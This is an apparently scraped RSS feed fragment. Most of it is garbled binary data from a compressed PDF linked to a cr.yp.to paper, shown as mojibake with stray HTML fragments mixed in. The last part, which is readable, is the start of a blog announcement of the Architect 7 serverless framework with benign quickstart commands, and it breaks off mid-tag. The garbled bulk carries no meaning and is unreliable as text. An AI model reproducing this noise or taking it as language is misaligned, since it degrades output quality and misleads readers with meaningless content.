^√ú]√ì‚Ä∞¬ª√†√ù√ØA√£≈í¬∏√Ø¬∏√ê¬¢3v∆ív¬¥¬æ"ÔøΩ√üZÔøΩ;¬°√´=√•b¬±√éAÀÜ√π‚Ç¨¬´∆í‚Äö1‚Ç¨‚ÄôIh√∏¬£y&nbsp;D:‚Äù1D√Ä¬∂S%Q¬Ω%√≤\√≠√ã¬•,‚Äî‚Äîs!)&nbsp;E√í√•\√£¬®ÀÜ√Ç√ï¬£b,\√¶√©hI√ÇS√π(ZR≈æ¬£‚Ä¢¬Ø√Ω√ò√ñ)0X√üTl√∞√∫%¬¥‚Äî√ª|}‚ÄûS√é√∫h≈°L&nbsp;¬©5‚Äò@√ç$h0t√¶¬≤lv√ª√≠√•\¬•F%J√≤(√á‚Äò‚Ä°¬≤K√ÇX(‚Ä∫J√≥T√ãÀÜM√¶Iq‚Äì√û0√•¬≠√øl√µp√≠;‚Äì∆íj≈°√ë!`‚Ä¢"R¬®i‚Ç¨U1\√∏]‚Ä∫√ï√é√ök‚Ä∫∆í√ãb√Å¬¨^√ß√ó√®≈Ω¬£#≈Ωn‚Äî≈Ω√ëvu2ty√ì√îa√à8‚Ç¨LJ√∞¬ºz√à¬§!FK¬ø+¬™bk¬µ¬≠Y*≈í√íz¬≤qt√Ñ!√´√í1Z!'s‚Ä¶¬ºU√à¬´K0K√π√µ:O¬¥¬∞fY‚Ä¢√≥uu9%√¨"√ä‚Ä¶‚ÄπÔøΩzÀÜ√í‚Äù√âH‚Ä¶!0√ì@* 2¬ß√™√©z√ë≈æ‚Äù‚Ç¨√™¬∞}GC√é.
√ü‚Äô}ÔøΩCk√å¬¥¬Æ$*‚Ä∫Z¬Æ`≈æ√∂√õ~|¬∏¬∂,D¬¨4√ëj(dGA√ò.cÔøΩ√ïS√Ö@≈í√Ü√î√îw√ò√†√Ç√≤ √ß√è√ÅÔøΩ√π@}‚Ñ¢$Y√ñ^sÔøΩ!?‚Ä∫¬º(@GB√Ñ.	¬£√Ω#ÔøΩJ;‚Ä°√ùcL√£K‚Ä°√ê¬¢&gt;N≈∏-*I√ä√É¬∂¬•¬Ω_U[&nbsp;Z¬¶\¬°ExÔøΩ#"≈ΩW‚ÄîÀÜ√ëxM¬•t≈ìu√∞√∫X¬∫t√Ç}H√±8√∏√∞√û√±%}‚ÄúzP√üR≈æO‚Äö`*HjzWG4≈Ω√Ä7≈Ω‚Äö8|
√æ√ø√óF√Ω¬ß¬ÆÔøΩ](√É‚Äò2√ç√í√Ç√∏X|
(E√Ü	¬¥√Ω¬∂7¬ªjY√∑¬ßb‚Ä∞ÀÜ√ä‚ÄòD¬°√¨Q0K1‚Ñ¢&amp;≈°√á-√ß√ãW¬∞B7C*9¬Ø√º`K√íh_]f,¬∏M‚Äò¬™‚ÄûJ√º¬∑=" .√î√¢@√Ö√õ√¢¬≥√Ö+ÔøΩ√é‚Äô√™√Ü?ÔøΩ)√è0P‚Äùa√Ä.√∂¬ª¬¢A√±√†{yco}Àúz≈ì‚Ä°√ßyX]‚Ç¨S√†M¬¶¬µr√ú‚Ä¢¬¥√ç≈í‚Äú¬∂√æ√ú√ß√∞√é√ΩP≈†W¬≠√éD√¢‚Äî√Ω√ß√ï‚Ä∫{√ßÔøΩ{b¬Æ^√Ø≈†
√ö}!‚Äô¬¢√∂√èz¬ª√Ç\√≥nYb‚Ñ¢√∑√∏≈∏¬µ¬•√ü¬Ω'√Üp&gt;√ãZ&gt;‚Ä†√Ñ√á9‚Äò√ú‚ÄπXÀú‚Äì‚Äî√ã√àRnKL¬µs√ö ?¬≤∆í3<!--√±√§¬æqVp√∞4√ÜÔøΩ√ÜÔøΩ‚Ä†¬¶√°G¬±8d√•"√≤¬∫√É√µ√∞ÔøΩ√¶≈ìSbN¬∏~0√ó‚Äò∆íi¬¢dv<Àú√ó¬®¬°‚Äô√Å√∞√®lnÀÜ√åp¬ºÔøΩ¬´¬ßÔøΩ√Ö≈í≈ì¬§‚Äö  ¬¨F√ª√≤√ß*SPt¬∞t]≈†√æG%¬§√º√∞4%A-¬£√≤	%√èl¬¢√ãvo√ó'‚ÄìF√Æ‚Ä°¬©¬ª√øWXB√åM
≈ì9√ë√ïY‚Ç¨Yg√≠√Ö√µ‚Ñ¢¬π√â‚Äòt√Ñ√´√í√±√≠√•&¬®v:√çEY¬§`√ç√ö[√™3S‚Äú√£√àÀÜ√ñ%√£√õ√åL√≤√¨q@9D√è¬©≈ìQÀÜ?	o√Ø¬±¬Ω√ÇÔøΩVw¬±‚Äò$D√ë√¨‚Äò√∞}'&¬π6ÔøΩN‚Äú&√°‚Ä†n≈æ‚Ñ¢‚ÄîI@√ó√üMZ‚Äô+M(≈∏&M√Ç5√∞ÀÜ√ë√ß¬¶%G‚Äô√á¬∞K√Ç√óÀú‚Äì¬§`J√ê‚Äô
X6M&‚Äû√ÉÔøΩW¬®√∏"√∏√†"FR¬¨K√Ö√ó√æ∆íÀÜÀú√∂Q5ÔøΩ√Ç√•√ó‚Ä¶√û‚Äú√†)√†√∫‚Ñ¢√≤X√çn√ò5≈Ω¬£!≈Ωf‚Äî‚Ä†o√ù5W8~"¬ß√πQ√ß≈°H!≈æ_AID√õ.√üCÔøΩ3¬µO‚Äö SD√π√ú√ÇH√¢√∏uI√∏‚Äìj√ôSj≈ì√∫¬†}0¬©<&√∏≈æ\CIA√ã._q
A≈ì√ó¬§Ia√ë≈ìN√ì¬Ø!¬¶]
A‚Ç¨√àt‚Äô≈æ4¬©}‚Äìp√é¬°
`¬∞
‚Ç¨=m!se≈ì‚Äπ&G¬∂._¬°	iPÔøΩ√ß≈∏¬†√ïz
¬∑Q¬Ø¬§√†-->ÔøΩ‚Ä¢‚Äù√ß¬§√Ü‚ÄìÔøΩ‚Äô¬´‚Ä¢
‚Ä†√úÀÜ¬æ√Ñ/≈†√ÜB√Ñ√Ü*√ìun√ê√πS\fP¬°G√Ç√ù¬π&lt;#p√ö√ö√û√ôu√≠√õ&gt;Kl√ÉK√£¬øZ√É6GN‚Äì`√ß√°(¬º‚Äπ/8I"¬¥hAz≈∏¬¶¬±√å¬ª ≈°¬™)X¬∏√Ä&gt;√û√ï6'=d√ß√ø]√ågg√Ø√≠‚Äò√Æ√Ö,l√£√Ω¬π√≤¬πf4(≈Ω‚ÄúL!‚Ä∫O8√ô¬¨P√¥ R¬∫√ç¬∑√ò`√±
‚Ä†‚Ä∫r√Üj√¨l‚Äú√ï√Ä√èm\#w√±¬¥√ªdH&nbsp;√´#e¬§∆í¬æs%√ó
√Ö#≈ì[8√°√Ü¬≥¬§√ΩC‚Äû√∫*√¢√´/¬®‚Äπ√º	√ï$¬∏S√π‚Ä¶j‚ÄôQLBj√üT{≈í√Ç¬∞≈æ√§b¬≤√ö?‚Äò]√Ω#=¬°@‚Ä†u¬∞¬¥O))¬• ‚Ä¶_&gt;√çN√ñ≈°¬¶‚Äù;e¬≥`*√î¬ÆRW
‚Ä∫Ad¬ºtcw¬®√ä¬¨S√Ñ√î√â√É√ªT¬∫√§t#S4√®¬¶‚ÄúuO¬ø√©¬¨≈°ar‚Äû√∂√±
wÔøΩ‚Äú√Ω%√¨.\¬ªn¬≠lA!√àE√™Bgck√¢~¬•√ô√™z√Ö[√®@ÔøΩÀÜ√è¬≤j√º√á^i¬™¬ªb‚Ä¶‚Ä∫‚ÄöQSÔøΩ√ôV¬≠+rÔøΩ&amp;X¬™¬®[6(√¥‚Ñ¢√ì √®]P√•M^.√¨‚ÄòS¬¶ÔøΩv¬ßÔøΩ<rh ÔøΩ≈ìx@4√Ñ√®9√æ¬Ω√ï2¬¢r≈∏√ê8_‚Ç¨3√º¬∏pk@√±√´√¢#¬æ√ö√à√í\ahwa√∫9√©‚Äúm¬¥&yzÔøΩv≈∏ma¬°1√§‚Äû‚Ä¶√ç√äym√†="√Ä√£" 4√â√Ü√ö√¶(="" &¬©≈°‚Ä¢√®;e√Æl√ê¬ß}¬±¬≥`|√ù√ä√ò¬æ√±¬≥√õ√è‚Äì="" √§√Ö√∏√Æv`¬º√£p]√∑="" 21n¬§√Ωc|‚Ñ¢√æ‚Ä°√û¬≠b√∫√Ωq√é‚Äú?√∂¬µ:√°¬™="" ¬Æ¬´#¬∫≈Ωo="" b‚Äú‚Ä¶="C√µ√∫√≤L√Ä√†√£,M√™U¬µ_/}√õ√ã¬≥i9`√ΩKu√ß√éÀÜ¬´kl¬∂¬´√úG" √îy√´√è√ò¬∞k√¢g¬∑z‚Äú)_√öÔøΩ√ª¬∑√ö="" √≤√ív√ª√ñ|√Éf√Ö√≠*√®="" ‚Ä†¬≥¬∫√è¬Æ¬∏r√å¬π√∏¬µvdb√ª}jz$l;¬´¬™%h√ò[¬£√Ωx√°gp√≠="" ¬≥√∞b√ø‚Äúo¬∂k‚Ä†‚Äöl√Åg√û1a√ü:_|¬¨}g~\√Äq¬±√ÆÔøΩ√†√ª√™f~p\√∫ym√ßm5√è√Ø‚Ç¨¬∑v≈Ω√Ø√∏-j√ñr¬ø√Ω¬ßu‚Äôo√Å,b2‚Ä†‚Ä∫√ä?‚Äπ¬¶√∂‚Äö‚Ñ¢√±="" ¬©j√©√ì√¢7√±strÔøΩ¬£ÔøΩ}¬´|[√á√à¬´¬´ÔøΩ¬≠√ä="" √û√∑√Öz√≠[a‚Äú¬¢="" 1z√∏}¬´{√Å√æ√≠[{j‚Ä†√≥n∆í‚Äì¬°'√±m√û*k¬¥√¨w‚Äì‚Ä°`√ò∆í}√ç√õ√ôo√≥‚ÄúÔøΩuvb|¬´√É√ø√àa≈ì8ÀÜ∆íÀÜ6√≥8ÔøΩb¬§gÔøΩj√ø√ûeÔøΩ√ü]8s‚Ä¶√∂√ä;√ü≈í√†√†¬∫oq‚Äö&√ø¬∏y#¬¥√µa‚Äö√ä≈æqÔøΩgqa√É‚Ä¶√º√∞="" ≈ì√ÑiÀú√á¬Æ√Ü√ô√ó<c="" +√ü¬πx[√ü√Ø¬ª√≥√•b¬®¬Ø¬∑¬≠¬•r‚Äùa="" √á¬∞√ú9√û0r√∏x¬¥‚Äûi¬¥‚Ä¶vw$¬†√¨ÔøΩh="¬Æ¬¶√î¬®dY‚Ç¨nr√ø√≥ÀÜ√öwy9c‚Ñ¢√¨¬πN7‚Äû≈∏√ï√µ¬∞¬π√ù-¬°≈Ωk√òÔøΩBÀÜ,√≠√¢√∞√≠¬Ω‚Äú¬≥√£¬®J√™&amp;G√â\¬∫#√Æ‚Äìp¬´≈†√Çw‚Äî]√ìq√£≈∏√ç¬™¬™m√ª√á¬∫=√∫q√¥x‚Äò√Ä_ÔøΩ0¬Æ‚Ä∞o√ø√∫lg√∏√≠‚Ä°‚Äîm√∞¬≤√ù√¥V√†" √¶∆í√Ø¬∂¬∞‚Ä¢z√†¬†^√∏√Ø≈∏a√é?="" √Æ√°√≤≈Ω√¶√å¬µ√∏ÀÜ‚Äû'√†2√ê5¬°≈∏√àc‚Äîc√Æf√§√á√ú√Ø√ì¬†-√ûi\√ó√Ç¬•√ø¬ø<w¬†="" endstream="" endobj="" 168="" 0="" obj="" <<="" length="" 3180="" filter="" flatedecode="">&gt;
stream
x√ö√ï√ôn√§√Ü√±]_1‚Ç¨44√ª√¢a ¬ª≈Ω7¬±√ò√éJN¬º√ª@qz4√ÑrH‚Ñ¢‚Ä°v'_≈∏¬∫√à!g¬©¬µ√óAbwuuwuUu]=*√î‚Ä∫√æ‚Äù|‚Äπ√£U¬¥y‚Ç¨√Ü√ü¬Æ^√û]}√±√äD‚Ä∫4√å√¢√òn√Æ√∂‚Ä∫$	¬¥b‚Äú‚Äûq‚Äôm√Æv‚Ä∫≈∏∆í√∏zkT¬¢∆í¬ø√¶u√©+√®X|√¢W/}[w¬Ω/√´√´¬∑w√üN√´~√±Jg¬•√Ç√å9ÔøΩ¬´F‚Ä∫¬≠vai^√ê\o‚Ä¢√í.xk$.(≈°√£c√û‚Äì]Ss√ø√ª&lt;U√û√ª√∫‚Ä†¬ø√ª√º√ö¬®√†	√ø5-∆í¬æ;√ù#uÔøΩo‚Äò‚Ç¨/^¬•‚Ä∫√é¬¢√£qW√öÀú7}Q√©:≈Ω∆í¬≤√û7√≠1√ØK√úO√á	x&nbsp;?‚Äù¬∑:_≈ì‚Ä°aÔøΩ¬æj¬Æ√°√≥~D√µ√ú√ò7‚Ä¢‚Äù√µ∆í¬™¬≤‚ÄìA^√Ü√ö¬≤√Ø}=n¬øX"ÔøΩ√≥√®4h√äB&amp;5{√ßx &lt;√≥‚Äòq@√ú√ì#`√ÄX¬°/‚Äπ%√ù√Ø¬ø¬π¬Ω√ÉV¬¥^√ö≈æ‚Ä°√∫√É¬µ
r√©0¬∑}7y≈æ√î‚Ä¢√øÔøΩ‚Äì
¬∂p√∂√®¬•ÔøΩxh‚Äî√∑9c√ã¬∫p≈ì*K√¨√õ√¶√àÀÜ?‚ÄπD¬°√Ç[√în¬æF‚Ä¢¬∞√âL6√Ü¬®0≈Ω≈í√ë¬π‚Äù¬ª√ê≈∏¬πÔøΩ√ñ%#√™[√¢*a√ÖK√Æ√¨Q+lj‚ÄöemS¬¥√çP√Ø¬∂≈°¬°&nbsp;Q√Ä/¬ø¬Ω√è;√î,√∑u√ë≈æY√ñÀÜ√í
√∑√á¬≤√´&nbsp;√ü√ù0F+√êiI¬æÀÜswh¬Ω√©√≥¬∂c≈í¬º[‚Äú√îb3¬∏,√öe0√ìs∆í9≈†¬≠GR.√¢hB√ï.eÔøΩ√Å√è√†¬ß¬≤6L≈í√Ω]√º¬§¬Ω‚Ä†Nh√ÇX¬∞u√¥}[L√ô‚Ä∫√àEmJ√ì√≤X√à√´√Ö¬¥√¢TT~;1ÔøΩe¬•\¬™L-√Ñ√ã√Ç‚Äö
8mbt¬¨]¬æ(√üD√ä‚Äö^W'(√äG√ò¬∞√∑zA$√íLl√§√†‚Äú√≥¬©9:x¬¨‚Ä†NZ√É}U√õwH)√©√æi!H¬±8S¬®¬¥&amp;31√ú¬≤,V√áP√ø√°¬±√äK¬∏e5-¬¥c‚Äù#~?G≈Ω&amp;S`√ë√ß√ã√±‚Ä†√∑¬∫√µR *
≈°¬∑!7√Ø√à√Ä!¬Ω‚ÄúÔøΩC√∞√ô√û√ä(≈ì
ÔøΩ√íK√ÅÔøΩ√ç√µ
√õ\¬∞¬∞g¬¢≈ì¬≠√ë#Q√Ø√ã√æ√ê(P≈æi¬∫J√Ü%b}`n¬©o¬´‚Äú¬§¬£√âqhr≈ì√Ç√ª√ëwx¬•a≈°¬•3c√ò[‚Äπ√û√ã√ñ¬µ√•!√≤(√≠6$¬æ~}w√µ√ã‚Ä¢b√Ø8¬∫&gt;‚Äπ√Ü¬∞(¬∏√â≈∏√üF‚Ä∫≈íÔøΩN‚Äû@√Ø	√≥¬∏1√ñ‚Ä¶¬©F√éW‚Ä∫√õ¬´^√Å(ÔøΩ&nbsp;d¬•√πZ≈ì¬´√çf√¥¬¶¬∞¬≤V‚Ä∫√°√¥‚Äù‚Ä∞¬æ¬ªF{u_√Ø√Å¬±≈°ÔøΩ4√çZhii√•√µn4y√ÑSÔøΩ√∑u√è√¢$¬¢t(}PYYn√ü&amp;#ÔøΩ¬≠!t.¬≠! √è¬¨!‚Äπ≈∏l!√Ω√Æ√Æ√æ√ò¬±√∑G√á√Ø√§3√≤)@‚Ä∫x√Ø√í6]t√∏√π√í¬±¬∞√°√∏√ßM@_&gt;y¬∏√æ`]%√é√ì‚Ä∞j¬æt2[:g~pg√ß√ë‚Ç¨√îp¬™¬ª≈í√ö¬°‚Äú4E√†N√û√±‚Äî√éq{√±√µ√≠V√©√¥f√ñ√ã¬¥√¥√®#X¬ª;Y√Ä√•4.√â¬¥√Æ¬Ø√í√†!q√¨√ü√ó3‚Äô¬™¬ÆY3G√ò≈ì.√ÖF.‚ÄöK√µNnM√Ñ7‚Äúy√é√Å√Äz√ë-lO√ä@√àg	ÔøΩ¬¢√π√ÉbY√Ö¬∞7√º¬Ω√Ä√î√µ‚Äö^‚Ä∫njW≈∏√∞‚Ä¶|g.‚Äì√Øi√è$?√∏^√ò‚Äö√°3ÔøΩ√ÇÔøΩ¬æ√µ√µC√®¬∏K√™√≥ÔøΩ√ú{¬¶≈Ω.√∑fM{G√õ√å‚Ä°√ºIZ¬¨√ì9S√®tv√¶%√ù≈Ωl*&nbsp;√Å‚Äî¬Ø‚Äò`¬®I1|√®8F√à4¬¢`¬∂√Ωe√à√´~82√∞¬´F&nbsp;¬∑√ø√∫‚ÄòU√ª√ô[√∂√úB√†RÔøΩ~√ó¬™‚Äù¬±≈Ωt3;¬¥√æÔøΩ¬©√õ√±≈æJJla8√º≈æ√é√õ2#K√º≈æ‚Ä∞‚Äö≈æs√®=3√ä√°G‚Ä†j7n¬≥
¬øzÔøΩh7`G√Æ
√àk√êv√Ü≈æ¬•oÔøΩ√ç√á
√ù¬£k@p/≈æ√â%¬∞¬Ω√®¬•√ù√±(\√∂¬π\√û√∂√≤&nbsp;‚Äú¬°
‚Äò√ü√ß‚Ä¶V¬©W56"¬∫≈íU¬∞*F√Ö√å	√¨√è8ÔøΩh∆í¬∞¬±√¶.√ú√∞/¬π5√ä¬Ω?K√Å_√±Ma√©√í‚Äö‚Ä¢re¬µ‚Ñ¢ÔøΩ√ÇÔøΩ√Ø‚Ä°‚Äπ√´"W&lt;‚Äπ√æ≈í√âÔøΩ¬¢√∞&amp;
u√¨√ò√µ)5√≥%6
ÔøΩ≈æ\√ü_√Ñ√è¬ΩÔøΩ
¬≥tr√Ñ¬∞L¬¶1≈í√°‚Ä¢‚Ä∞√∞?2;	/NÔøΩ‚Äπ≈ì √°¬≥¬°√ú¬´.d√Ä√ü√≥'√∞*xÀú^\√ítgBw.√∑√í√éÔøΩ¬∫ÀÜ9√Än&gt;¬©<d¬∂√õa‚Äö√ò√∫√®ÔøΩ8gi.¬¢qr_ÔøΩ"7√ûfy√ü√±4√ê"6k√ò‚Äò√Ä¬§¬º¬¶og~ÔøΩ¬Ω‚Ñ¢√é‚Ç¨ ¬π‚Ä¶%ÀÜm¬¢¬ød‚Ñ¢√ê‚Äìs‚Äî√∞√°¬∞;n¬∂√à√°¬¥¬¶il="" √ß√íÔøΩ¬´‚Ä†#p¬º√ßm√ü¬´m√ä√π¬©m(v¬∑)¬π√ü="">√ë5cH¬µ4"b¬ø‚Ä∞ÔøΩ√è¬•,√ô¬¶K¬¢√Ñ¬•√Å√∞√≠√ú√ö#√´^‚Äò√¨"√∂√¥	√ú√ö√≥√±8M1‚Äò√£(g√â‚Ä†√àÔøΩ√°?¬¥.T e¬Ω+√ë¬°‚Äò¬æB≈∏r1ÔøΩ‚Äö}`√ã‚Ç¨¬´~¬¥"√ò
X√≥√§ÔøΩk¬∞√£o√éX√è√•‚Ä°K-!¬±(<zh√òic¬ß+jx‚Ä∞s‚Ä†√§u^ÔøΩ¬∫ÔøΩ¬¢q`a∆í(d‚Ä†v√ô3 m‚Ä∞‚Äú√≥¬Ω√ß¬©nf√è0√Ç¬π√†‚Äπ‚Äú¬•x‚Äìc_¬´√¨‚Äö√ï‚Äû¬®√Å√ñ¬¨Àú¬†¬∑√ël‚Äî¬Ωh√≤¬®h‚Äπ‚Ç¨o¬¢4@√º¬¶4i√â¬†i√ä√É≈Ωo√ó}√â√ô√åj¬∏="" √∂√ç√é¬¨wf‚Ä∞¬¢¬≤√ê√Ñ≈†‚Ä∞‚Äì%≈∏\`a√æ¬∞5√ï√∫√Ä√Üt¬æ$√èq:%]o"√≠v√¨i&v2¬∏≈°\d‚Äû≈°√¥lpm+‚Äò?‚ÄûÔøΩ¬≤√ô="" √∏¬¨‚Äù¬Ω¬∞√úeg√ã¬≠b¬Ωb≈í‚Äö√¨="" ‚Ä¶+2√õ="" ldej√•ex{f;w.‚Äö9≈í≈∏xfs√ò4e"√ú‚Ä¶d$√º√≠√¢√öbn¬£c6√Æ¬©√ïtÔøΩe√∫√øx`√¶√ó¬¶¬∑√Ä√åm`b¬ß0√ß√∫,√æ}s¬ø&0#)@‚Ä¶i‚Äô‚Äô¬µ¬≥`√µ‚Äì¬©≈†‚Ä∞√ÜtegÔøΩ√õ`¬ªw="" f‚Ç¨@√øÔøΩ2¬¶="" √öÔøΩl√π√á≈ì√øw¬§‚Äû]√§t√•c√ßÔøΩ√£a√Ç≈∏c√†6√π="" ¬øf√Øxu√â‚Äùg‚Äú√ã√æy?m1{‚Äùp4]‚Äò√áeb#√â‚Ä¢qdwj¬£nzn4√Äsc¬±<√¢1¬¨m√ò="" kl‚Ä¶√ô√ël√∑Àúcp√ò√©="" 6√∞¬≥√úpo√öa¬¨√ê‚Äôp‚Äû≈æ‚ÄπsÔøΩdnq√°¬≥w="" #r√Ω$¬°q√¥¬¥¬±√¥r√ætp‚Äúcg@;w‚Ä°‚Ä†√í'√ãa6‚ÄöÔøΩ√á¬°≈æ"z_0¬°√µ√Æ√Äg√ÉvÔøΩ¬π%"¬µÔøΩ‚Ä¢‚Äì5‚Ä†+="">Z√ä¬≠SG√â\≈ìTe√úB√ù&nbsp;ÔøΩc.√Ç:¬ø¬¨(√Ü √ëx¬º√ØN√∑¬æuj√≠vX¬∞√ìUE√Ü¬Ø,‚Ä†≈†q¬™√≤√°√êw√π√Ω√∏P¬≥X√ç9¬∏√π√™l\t?&gt;q0√â‚Ä∞‚Ä∞¬πqO,‚Äû0n,L√û`RN^¬•√¨¬≥√ï√Ü‚Ä¶Y‚Äì.¬•√ã√ì√óÀÜ5¬°=√õ√ï};&lt;√Ü√é¬¨√ë¬™√ÇHgsZ√ì,B¬≤dI∆í√ñY‚ÄúD@√ídp¬≥√Éc¬ß#‚Ä∫√ÜI¬≤f‚ÄúP¬•√≥3¬£Vv√Ü‚Äòm‚Äì¬≤!d¬©F[¬≠t√®√í‚Äπ¬™√Æ¬™6YAk√æ√é¬¥	¬ª`¬π√Å¬∑l]‚Ä∫&nbsp;¬©‚Ä¶6%q¬∫¬ÆMY√≤+√ö‚Äù‚Ä¶:≈°√ò√æ≈ì"√às‚Äú√¥EBjU‚Äù¬¶√ú¬∫√î$¬¨~√å5)
√àr1f¬≤¬™4√ÄIw¬°c¬¨&lt;¬©[‚Äú¬§√ÉB¬≤ÔøΩ√ì¬ßTj√ô√∞6g√≠‚Äò‚Äô√ñ≈†√∂‚Ç¨√∑:_&gt;√ëeq¬™√ï≈°√∂√Ñ¬°¬≥√±bOm¬¢‚Ä¢=√ázT≈°A≈°~‚Äò¬ß√èm	i*Dc∆í¬≥‚Äì+√∏¬¢9√ΩP∆í√ë√ß¬∫¬¶≈í‚Ä¢5y√ü√ã√¨¬•-6l√¥M‚Äù{√ø≈æ√ª√ã"!√ài`∆í√≤‚Äû√≤	G4w√á[te√∏√¢#I√ø√ëcÔøΩ'd√†√§hc‚Ä¶%FH√ñ¬®√Ü#√®√ö√º√Ås¬´T√Ñ√∑¬§9ÔøΩ _+√§¬ª.√∂_3√†j¬∞‚Äö
√´bZ√ßU≈∏¬±Oi|√∑yQVX√≥√úJ√©WÔøΩ¬¢‚Ñ¢√ç8¬¢¬ª:¬ßq)¬™¬¶¬£√∫u√é√µM√ûqv¬¢ÔøΩQ^¬´√≤¬Ω√∞√ã¬§yK‚Äúd"√∏Su‚Ä∫G¬∏¬≤‚Ä°C¬Ω√†J¬æL¬∞√£P¬æd0‚Ä¢W√Ü¬µ)≈ì√â%ÔøΩ√à√ê9¬ø@RW√§‚Ä¢√Ä√â√≠!¬®¬§¬£‚ÄîRHz√∂4|¬¢‚Ñ¢√™√Ø.x‚Ä¶ÔøΩ¬°√Ö√§uL‚Ç¨ox‚Äû¬§&lt;√™¬π√çAÔøΩV¬≠√èw'√Æt(¬§ÔøΩ√å[√Ü‚Äûq√º)e√Å7√äX)1√ú∆í¬©y√≤√≠¬ª¬≤¬™√æ√Ñ√ù√èyW√óiÀú√®√â√Ç8√ª√õ√É√π‚Äπga¬±√£‚Äö√æ√Ωx¬Ω√∞yM¬≤√â@6¬Æc[t";?¬µ`ÔøΩF‚Äò√î√±‚Äò~‚Ä¢0√æ√Æ√ü√àq√º)d√ë√¥√î‚ÄòK√ù‚Ä°¬™√∞√Ä ¬æ*N‚Ä†b‚Äπ√ß
√Å¬•gCjQ√ß√í√ô√´v√º‚Ä°ÔøΩ√î
√∑~¬∫√•√Øc≈ΩqZ√áÔøΩ,√ä,ÀúG√ÆpXÔøΩPm√£8q√ú√Å0¬ß{`o√Ü¬§√≥√∑√á5¬≠√§√∏U√Ö√Åm&gt;¬¢√ù0`zF√•:?√Ø0√æ¬ø¬ø{√ΩS√à√ç‚Äî#√íxI¬±}ÔøΩ¬ß
?√é√è√ª√ã:√§|√πn√úx¬ΩD=‚Ä∞√îj‚Ä°OZM√µD√ûz¬ª¬°e√ä¬¥&lt;82_i√∞‚Ä∫ÔøΩVÔøΩ\‚Ç¨√è√±√∏√•l√´i√£‚Äπ&lt;-	√èhf¬°√ª8¬¥√ºmz¬ø√ñN≈ΩÔøΩ{√ê&amp;√Å#28_¬ø_√ü]√Ω¬™*∆í≈°
endstream
endobj
176 0 obj
&lt;&lt;</zh√∏ic¬ß+jx‚Ä∞s‚Ä†√§u^ÔøΩ¬∫ÔøΩ¬¢q`a∆í(d‚Ä†v√π3></d¬∂√ªa‚Äö√∏√∫√®ÔøΩ8gi.¬¢qr_ÔøΩ"7√æfy√ü√±4√∞"6k√∏‚Äò√†¬§¬º¬¶og~ÔøΩ¬Ω‚Ñ¢√Æ‚Ç¨></rh></e√≥@nz¬Ωf≈æ√ø¬µu√Ω√≤!√ü`¬°"bte√¶\l[√ª√≤≈æ<¬∏ÔøΩ1`√∑{¬ßo¬µÔøΩ‚Äû√´√¨Àú√™√°√ó√∑yq|√°√£‚Äî$√™‚Ä∞vq‚Äùv^?t√Ω¬´3¬π√†√¥ÔøΩÔøΩ√´¬Ø?√≤√∫¬®></f^ÔøΩ√Ω√∞w≈ì√æ√¥></w¬ºvn¬≤ÔøΩ‚Äî√¶√ØÔøΩ√£¬¨5√º¬∫$></hp‚Ç¨√£≈æ√µ√©mp√±x;¬∑h.¬±√´></qv√±√º2‚Ä∫7¬∑<></m¬•¬∑w√™‚Ç¨¬°ÔøΩ?@d√§√ª¬ª0√¥√¨pwj@‚Ñ¢‚Ç¨4></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cr.yp.to/papers/categories-20200918.pdf">https://cr.yp.to/papers/categories-20200918.pdf</a></em></p>]]>
            </description>
            <link>https://cr.yp.to/papers/categories-20200918.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520781</guid>
            <pubDate>Fri, 18 Sep 2020 19:13:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Architect Serverless Framework 7 released]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24520761">thread link</a>) | @nailer
<br/>
September 18, 2020 | https://blog.begin.com/architect-7-0-http-apis-and-even-better-sandbox-testing-c84df06cd443 | <a href="https://web.archive.org/web/*/https://blog.begin.com/architect-7-0-http-apis-and-even-better-sandbox-testing-c84df06cd443">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><h2 id="b68f">By popular demand: API Gateway HTTP APIs are now the default in Architect serverless apps</h2><div><div><div><p><a href="https://blog.begin.com/@ryan?source=post_page-----c84df06cd443--------------------------------" rel="noopener"><img alt="Ryan Block" src="https://miro.medium.com/fit/c/96/96/2*EfV_5cNqDQE8MFejOm6FKg.png" width="48" height="48"></a></p></div></div></div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1996/1*w8l-oRuAMOvf6ICSmVXF4w.png" width="998" height="182" srcset="https://miro.medium.com/max/552/1*w8l-oRuAMOvf6ICSmVXF4w.png 276w, https://miro.medium.com/max/1104/1*w8l-oRuAMOvf6ICSmVXF4w.png 552w, https://miro.medium.com/max/1280/1*w8l-oRuAMOvf6ICSmVXF4w.png 640w, https://miro.medium.com/max/1400/1*w8l-oRuAMOvf6ICSmVXF4w.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*w8l-oRuAMOvf6ICSmVXF4w.png?q=20"></p></div></div></div></figure><p id="5007">OpenJSF Architect now powers thousands of serverless applications all over the world. Folks continue to tell us they value its focused, direct, stable, lock-in-free approach to building blazing fast modern web apps without ever having to manage a single server.</p><p id="caa4">Today we‚Äôre extremely excited to announce Architect 7 (Chupacabra), a major step forward in building serverless web apps and APIs with AWS.</p><p id="f7da">Chupacabra now deploys AWS API Gateway v2.0 (aka <code>HTTP</code>) APIs by default, and ships with a rewrite of Architect‚Äôs local development environment, Sandbox. The new Sandbox includes full local/offline support for building with <code>HTTP</code> APIs, and an even better interface for integrating Architect into your automated testing, from <code>tape</code> to <code>jest</code> (and everything in between).</p><p id="e527">Want to give it a go? Here‚Äôs the super quickstart, no AWS credentials required:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1200/1*oRk_AWfRGDx0MzXJTmeYNw.gif" width="600" height="338" srcset="https://miro.medium.com/max/552/1*oRk_AWfRGDx0MzXJTmeYNw.gif 276w, https://miro.medium.com/max/1104/1*oRk_AWfRGDx0MzXJTmeYNw.gif 552w, https://miro.medium.com/max/1200/1*oRk_AWfRGDx0MzXJTmeYNw.gif 600w" sizes="600px" data-old-src="https://miro.medium.com/freeze/max/60/1*oRk_AWfRGDx0MzXJTmeYNw.gif?q=20"></p></div></div></figure><p id="a9f0">First: <code>npm init @architect ./your-app-name</code> <br>Then: <code>npx arc sandbox<br></code><strong>That's it!</strong></p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1960/1*3FwfgGmDs6TR5RIpacUbYA.png" width="980" height="534" 